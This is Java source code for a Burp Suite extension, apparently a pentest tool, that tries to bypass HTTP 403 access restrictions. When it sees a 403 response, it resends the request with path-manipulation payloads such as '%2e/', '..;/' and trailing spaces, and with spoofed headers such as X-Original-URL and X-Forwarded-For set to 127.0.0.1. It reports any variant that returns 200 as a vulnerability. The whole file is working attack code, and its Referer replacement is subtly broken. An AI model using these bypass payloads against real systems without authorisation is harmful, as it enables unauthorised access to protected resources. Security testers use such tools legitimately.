package burp;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class BurpExtender implements IBurpExtender,IScannerCheck
{
    private IExtensionHelpers _helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    private IBurpExtenderCallbacks _callbacks;
    public static String NAME = "403ByPass_BaizeSEC";
    public static String VERSION = "1.0";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        // 设置插件的名称
        callbacks.setExtensionName(NAME);
        this._callbacks = callbacks;

        // 获取burp提供的标准输出流和错误输出流
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);

        _helpers = callbacks.getHelpers();

        callbacks.registerScannerCheck(this);
        this.stdout.println(basicInformationOutput());

    }


    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        List<String> results = new ArrayList<>();


        IRequestInfo iRequestInfo = _helpers.analyzeRequest(baseRequestResponse);


        IResponseInfo iResponseInfo = _helpers.analyzeResponse(baseRequestResponse.getResponse());

        if(iResponseInfo.getStatusCode()!=403) return null;
        String oldReq = _helpers.bytesToString(baseRequestResponse.getRequest());
        String oldUrl = iRequestInfo.getUrl().getPath();
        while(oldUrl!="/" && oldUrl.endsWith("/")){
            oldUrl=oldUrl.substring(0,oldUrl.length()-1);
        }
        String previousPath = oldUrl.substring(0,oldUrl.lastIndexOf("/"));
        String lastPath = oldUrl.substring(oldUrl.lastIndexOf("/")+1);


        stdout.println("Scanning: "+iRequestInfo.getUrl());

        String[] payloads = new String[]{"%2e/"+lastPath, lastPath+"/.", "./"+lastPath+"/./", lastPath+"%20/", "%20"+lastPath+"%20/", lastPath+"..;/",lastPath+"?",lastPath+"??","/"+lastPath+"//",lastPath+"/",lastPath+"/.randomstring"};
        String[] hpayloads = new String[]{"X-Rewrite-URL: "+oldUrl, "X-Original-URL: "+oldUrl,"Referer: /"+lastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwarded-Host: 127.0.0.1"};

        for(String p:payloads){
            String newReq = oldReq.replace(oldUrl,previousPath+"/"+p);
            IHttpRequestResponse checkRequestResponse = _callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),_helpers.stringToBytes(newReq));
            short STT_CODE = _helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode();
            if(STT_CODE == 200) {
                results.add("Url payload: "+_helpers.analyzeRequest(checkRequestResponse).getUrl()+" | Status code: "+STT_CODE);
            }
        }

        for(String hp:hpayloads){
            String newReq="";
            if(hp.startsWith("Referer:") && oldReq.contains("Referer:")){
                newReq = oldReq.replace("^Referer:.*?$",hp);
            }else{
                newReq = oldReq.replace("User-Agent: ",hp+"\r\n"+"User-Agent: ");
            }

            IHttpRequestResponse checkRequestResponse = _callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),_helpers.stringToBytes(newReq));
            short STT_CODE = _helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode();
            if(STT_CODE == 200) {
                results.add("Header payload: "+hp+" | Status code: "+STT_CODE);
            }

        }
        if(results.toString().equals("[]")) return null;
        CustomScanIssue customScanIssue =  new CustomScanIssue(
                _helpers.analyzeRequest(baseRequestResponse).getUrl(),
                "403 ByPass Vuln",
                0,
                "High",
                "Certain",
                null,
                null,
                results.toString(),
                null,
                new IHttpRequestResponseWithMarkers[]{_callbacks.applyMarkers(baseRequestResponse, null, null)},
                baseRequestResponse.getHttpService()
                );

        List<IScanIssue> issues = new ArrayList<>();
        issues.add(customScanIssue);
        stdout.println("===================================");
        stdout.println("恭喜！有一个漏洞被发现，漏洞信息为: "+_helpers.analyzeRequest(baseRequestResponse).getUrl()+" "+results);
        stdout.println("===================================");
        return issues;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getUrl()==newIssue.getUrl())  return -1;
        return 0;
    }

    /**
     * 基本信息输出
     */
    private static String basicInformationOutput() {

        String str1 = "===================================\n";
        String str2 = String.format("%s 加载成功\n", NAME);
        String str3 = String.format("版本: %s\n", VERSION);
        String str4 = "作者: BaiZeSec_ahui\n";
        String str5 = "邮箱: aaaahuia@163.com\n";
        String str6 = "===================================\n";
        String detail = str1 + str2 + str3 + str4  + str5 + str6;
        return detail;
    }


}